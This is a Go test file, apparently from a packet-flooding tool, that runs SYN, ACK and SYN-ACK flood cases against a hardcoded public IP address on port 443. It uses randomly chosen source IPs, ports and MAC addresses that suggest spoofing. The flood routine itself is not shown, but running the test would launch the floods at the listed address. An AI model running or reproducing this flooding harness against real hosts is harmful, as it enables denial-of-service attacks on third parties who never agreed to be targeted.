package raw

import (
	"context"
	"math/rand"
	"testing"
	"time"
)

func TestStartFlooding(t *testing.T) {
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()
	cases := []struct {
		name, floodType                 string
		payloadLength, srcPort, dstPort int
		floodMilliSeconds               int64
		srcIp, dstIp                    string
		srcMacAddr, dstMacAddr          []byte
	}{
		{"100byte_syn", "syn", 100, srcPorts[rand.Intn(len(srcPorts))],
			443, 50, srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{
			"100byte_ack", "ack", 100, srcPorts[rand.Intn(len(srcPorts))],
			443, 50, srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))],
		},
		{
			"100byte_synack", "synAck", 100, srcPorts[rand.Intn(len(srcPorts))],
			443, 50, srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))],
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.TODO(), time.Duration(tc.floodMilliSeconds)*time.Millisecond)
			t.Logf("starting flood, caseName=%s, floodType=%s, floodMilliSeconds=%d\n", tc.name, tc.floodType, tc.floodMilliSeconds)
			go func() {
				err := StartFlooding(tc.dstIp, tc.dstPort, tc.payloadLength, tc.floodType)
				if err != nil {
					t.Errorf("flooding process returned an error: %s\n", err.Error())
					return
				}
				t.Logf("ending flood, caseName=%s, floodType=%s, floodMilliSeconds=%d\n", tc.name, tc.floodType, tc.floodMilliSeconds)
			}()

			select {
			case <-time.After(120 * time.Second):
				cancel()
				t.Log("overslept")
			case <-ctx.Done():
				cancel()
				t.Logf("context closed, caseName=%s, floodType=%s, floodMilliSeconds=%d\n", tc.name, tc.floodType, tc.floodMilliSeconds)
			}
		})
	}
}
